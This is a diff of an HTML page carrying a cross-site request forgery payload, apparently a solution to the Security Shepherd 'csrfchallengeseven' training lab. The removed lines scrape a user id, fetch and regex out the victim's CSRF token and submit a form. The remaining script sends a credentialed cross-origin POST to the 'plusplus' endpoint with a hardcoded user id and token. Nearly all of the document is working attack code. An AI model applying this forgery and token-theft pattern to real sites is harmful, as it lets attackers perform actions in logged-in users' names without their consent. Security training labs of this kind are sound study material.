@@ -3,26 +3,13 @@
         <iframe sandbox="allow-scripts allow-forms allow-same-origin" src="https://security-shepherd.dev.inf.elasticnet.co/challenges/7d79ea2b2a82543d480a63e55ebb8fef3209c5d648b54d1276813cd072815df3.jsp" >
         </iframe>
         <script>
-            document.domain="security-shepherd.dev.inf.elasticnet.co";
-            var userId = $(contentDiv).children('ul')[0].children[0].children[0].text;
-            const regex = /Your csrf Token for this Challenge is: (.+) <br\/>/;
-            const csrf=fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/getToken?userId='+ userId)
-                .then(resp=>resp.text())
-                .then(body=>{
-                                let match = body.match(regex);
-                                return match[1];
-                            })
-
-            
-            document.csrfForm.submit();
-
             fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengeseven/plusplus', {
                 method: 'POST',
                 credentials: "include",
                 mode: "no-cors",
                 body: JSON.stringify({
                     "userId": "d35874530d87a07ad3cd5864affdf5736743f5ad",
-                    "csrfToken": csrf,
+                    "csrfToken": "64209867419946110764791174083646112488",
                 })
             });
         </script>
